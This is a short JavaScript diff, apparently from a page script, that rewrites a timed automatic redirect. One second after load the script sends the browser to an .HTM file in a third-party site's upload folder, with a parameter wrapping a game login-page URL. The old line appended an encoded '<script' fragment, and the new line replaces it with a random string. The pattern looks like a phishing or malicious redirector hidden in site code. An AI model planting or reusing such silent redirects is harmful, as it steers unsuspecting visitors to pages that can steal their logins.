@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'http://www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM?url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html' + 'u' + timestamp + '%3Cscript';
+    var url = 'http://www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM?url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html' + 'u' + timestamp + 'utdxj';
     location.href = url;
 }, 1000);
